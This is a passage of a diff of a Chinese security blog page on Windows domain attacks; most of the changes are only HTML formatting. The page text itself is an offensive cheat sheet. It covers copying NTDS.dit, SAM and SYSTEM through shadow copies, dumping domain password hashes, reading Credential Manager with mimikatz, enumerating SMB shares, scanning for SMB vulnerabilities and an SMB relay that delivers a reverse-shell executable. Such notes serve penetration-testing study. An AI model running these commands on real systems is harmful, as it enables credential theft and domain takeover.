class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\NTDS\NTDS.dit&quot; -ComputerName SERVER -localDestination &quot;C:\temp\NTDS.dit&quot;</div><div class="line">需要文件：</div><div class="line">https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</div><div class="line"></div><div class="line">vssadmin Delete Shadows /shadow=&#123;ce51aaf6-5677-4423-86ac-45d064ef626e&#125; /quiet        删除卷影副本</div><div class="line">vssadmin Delete Shadows /For=C:</div><div class="line"></div><div class="line">---</div><div class="line"></div><div class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters        查询NTDS路径</div><div class="line">获取域数据库</div><div class="line">Windows\NTDS\ntds.dit</div><div class="line">Windows\System32\config\SYSTEM</div><div class="line">Windows\System32\config\SAM</div><div class="line"></div><div class="line">NTDSDump导出域数据库hash值：</div><div class="line">NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</div><div class="line">或者：</div><div class="line">QuarksPwDump.exe</div><div class="line">QuarksPwDump --dump-hash-domain --with-history        导出本机域控历史hash值</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">vssadmin Create Shadow /for=C：        创建新的卷影副本</span><br><span class="line">成功地创建了 &apos;C:\&apos; 的卷影副本</span><br><span class="line">   卷影副本 ID: &#123;ad7dfdec-a8db-4fa3-b2e6-7e1ab1bad2b4&#125;</span><br><span class="line">   卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3</span><br><span class="line"></span><br><span class="line">执行程序：</span><br><span class="line">\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\test\psexec.exe</span><br><span class="line">1.需要先创建好目录，并放入木马或程序</span><br><span class="line">2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 &quot;?&quot; 需要改为 &quot;.&quot;号执行程序</span><br><span class="line"></span><br><span class="line">Copy Files</span><br><span class="line">有些系统运行中的文件是不可复制的，比如像SAM</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</span><br><span class="line"></span><br><span class="line">PowerShell调用方法：</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -ComputerName SERVER -localDestination &quot;C:\temp\SYSTEM&quot;</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\NTDS\NTDS.dit&quot; -ComputerName SERVER -localDestination &quot;C:\temp\NTDS.dit&quot;</span><br><span class="line">需要文件：</span><br><span class="line">https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</span><br><span class="line"></span><br><span class="line">vssadmin Delete Shadows /shadow=&#123;ce51aaf6-5677-4423-86ac-45d064ef626e&#125; /quiet        删除卷影副本</span><br><span class="line">vssadmin Delete Shadows /For=C:</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters        查询NTDS路径</span><br><span class="line">获取域数据库</span><br><span class="line">Windows\NTDS\ntds.dit</span><br><span class="line">Windows\System32\config\SYSTEM</span><br><span class="line">Windows\System32\config\SAM</span><br><span class="line"></span><br><span class="line">NTDSDump导出域数据库hash值：</span><br><span class="line">NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</span><br><span class="line">或者：</span><br><span class="line">QuarksPwDump.exe</span><br><span class="line">QuarksPwDump --dump-hash-domain --with-history        导出本机域控历史hash值</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="external">更多</a></p>
+<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">更多</a></p>
 <h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><h3 id="windows中的Credential-Manager的信息获取"><a href="#windows中的Credential-Manager的信息获取" class="headerlink" title="windows中的Credential Manager的信息获取"></a>windows中的Credential Manager的信息获取</h3><ul>
 <li>Credential Manager，中文翻译为凭据管理器，用来存储凭据(例如网站登录和主机远程连接的用户名密码)。</li>
 <li>如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录<br><img src="/2017/09/28/windows域安全/cmdkey.png" alt=""></li>
 <li>凭据类别包含两种，分别为Domain Credentials和Generic Credentials。</li>
-<li>凭据读取 mimikatz和powershell脚本<br><img src="/2017/09/28/windows域安全/mimikatzdumpcredman.png" alt=""><br>更多可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/" target="_blank" rel="external">Windows中Credential Manager的信息获取</a><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><a href="https://github.com/SpiderLabs/scavenger" target="_blank" rel="external">横向渗透信息搜集工具</a><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="SMB共享枚举"><a href="#SMB共享枚举" class="headerlink" title="SMB共享枚举"></a>SMB共享枚举</h3></li>
-<li><p><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="external">SMBMap</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">root@kali:/# smbmap -H [ip] -d [domain] -u [user] -p [password]</div><div class="line">[+] Finding open SMB ports....</div><div class="line">[+] User SMB session establishd on [ip]...</div><div class="line">[+] IP: [ip]:445        Name: [ip]                                      </div><div class="line">        Disk                                                    Permissions</div><div class="line">        ----                                                    -----------</div><div class="line">        ADMIN$                                                  NO ACCESS</div><div class="line">        C$                                                      NO ACCESS</div><div class="line">        IPC$                                                    NO ACCESS</div><div class="line">        NETLOGON                                                READ ONLY</div><div class="line">        Replication                                             READ ONLY</div><div class="line">        SYSVOL                                                  READ ONLY</div></pre></td></tr></table></figure>
+<li>凭据读取 mimikatz和powershell脚本<br><img src="/2017/09/28/windows域安全/mimikatzdumpcredman.png" alt=""><br>更多可参考<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/" target="_blank" rel="noopener">Windows中Credential Manager的信息获取</a><h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><a href="https://github.com/SpiderLabs/scavenger" target="_blank" rel="noopener">横向渗透信息搜集工具</a><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="SMB共享枚举"><a href="#SMB共享枚举" class="headerlink" title="SMB共享枚举"></a>SMB共享枚举</h3></li>
+<li><p><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener">SMBMap</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# smbmap -H [ip] -d [domain] -u [user] -p [password]</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on [ip]...</span><br><span class="line">[+] IP: [ip]:445        Name: [ip]                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS</span><br><span class="line">        NETLOGON                                                READ ONLY</span><br><span class="line">        Replication                                             READ ONLY</span><br><span class="line">        SYSVOL                                                  READ ONLY</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>使用nmap </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script smb-enum-shares -p 139,445 [ip]</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-enum-shares -p 139,445 [ip]</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h3 id="查看SMB的漏洞"><a href="#查看SMB的漏洞" class="headerlink" title="查看SMB的漏洞"></a>查看SMB的漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script smb-vuln* -p 139,445 [ip]</div></pre></td></tr></table></figure>
-<h3 id="trick4-smbrelay"><a href="#trick4-smbrelay" class="headerlink" title="trick4 smbrelay"></a>trick4 smbrelay</h3><p>python smbrelayx.py -h 172.24.243.59（被攻击的机器） -e smb_rev.exe<br><img src="/2017/09/28/windows域安全/smbrelay.png" alt=""><br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="external">https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py</a><br><a href="http://www.91ri.org/9022.html" target="_blank" rel="external">再谈SMB中继攻击</a></p>
+<h3 id="查看SMB的漏洞"><a href="#查看SMB的漏洞" class="headerlink" title="查看SMB的漏洞"></a>查看SMB的漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-vuln* -p 139,445 [ip]</span><br></pre></td></tr></table></figure>
+<h3 id="trick4-smbrelay"><a href="#trick4-smbrelay" class="headerlink" title="trick4 smbrelay"></a>trick4 smbrelay</h3><p>python smbrelayx.py -h 172.24.243.59（被攻击的机器） -e smb_rev.exe<br><img src="/2017/09/28/windows域安全/smbrelay.png" alt=""><br><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket/blob/master/examples/smbrelayx.py</a><br><a href="http://www.91ri.org/9022.html" target="_blank" rel="noopener">再谈SMB中继攻击</a></p>
 
       
     </div>
@@ -510,8 +508,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/10/01/windows权限提升(二)/" rel="next" title="windows权限提升(二)">
-                <i class="fa fa-chevron-left"></i> windows权限提升(二)
+              <a href="/2017/09/28/CmakeVSautotools/" rel="next" title="Cmake VS Autotools">
+                <i class="fa fa-chevron-left"></i> Cmake VS Autotools
               </a>
             
           </div>
@@ -520,8 +518,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/09/28/CmakeVSautotools/" rel="prev" title="Cmake VS Autotools">
-                Cmake VS Autotools <i class="fa fa-chevron-right"></i>
+              <a href="/2017/10/01/windows权限提升(二)/" rel="prev" title="windows权限提升(二)">
+                windows权限提升(二) <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -570,7 +568,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -580,10 +578,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -710,7 +706,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
